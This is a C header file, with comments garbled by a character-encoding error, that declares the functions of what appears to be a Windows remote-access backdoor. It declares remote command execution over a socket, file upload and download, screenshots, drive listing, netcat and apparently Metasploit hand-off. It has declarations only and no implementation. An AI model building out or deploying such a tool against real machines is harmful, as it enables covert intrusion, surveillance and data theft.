#pragma once
#include "socket.h"
#include "process.h"
#include "misc.h"
#include <ShlObj.h>

/**
 *
 * ����ִ����صĲ���
 * ��
 * 2022/3/8
 *
**/

// ���͵�ǰ·��
void SendPath(SOCKET sServer);
// ִ������
void ExecCmd(SOCKET sServer, char cmd[]);
// ����cmdִ�к�Ľ��
void SendCmdResult(SOCKET sServer, char cmd[]);
// ��ȡʱ���
void GetTimestamp(char str[]);
// �л�·��
BOOL ChangePath(char cmd[]);
// �����ļ�
BOOL Download(SOCKET sServer, char cmd[]);
// �ϴ��ļ�
BOOL Upload(SOCKET sServer, char cmd[]);
// ����NC
BOOL NC(SOCKET sServer, char cmd[]);
// ��Ļ��ͼ
BOOL ScreenShot(char path[]);
// ��������
BOOL Screen(SOCKET sServer,char cmd[]);
// ��������
BOOL Drive(SOCKET sServer, char cmd[]);
// ����msf
BOOL MSF(SOCKET sServer, char cmd[]);
// ��ȡpid
BOOL GetPID(SOCKET sServer, char cmd[]);
// �����˵�
BOOL Help(char cmd[]);

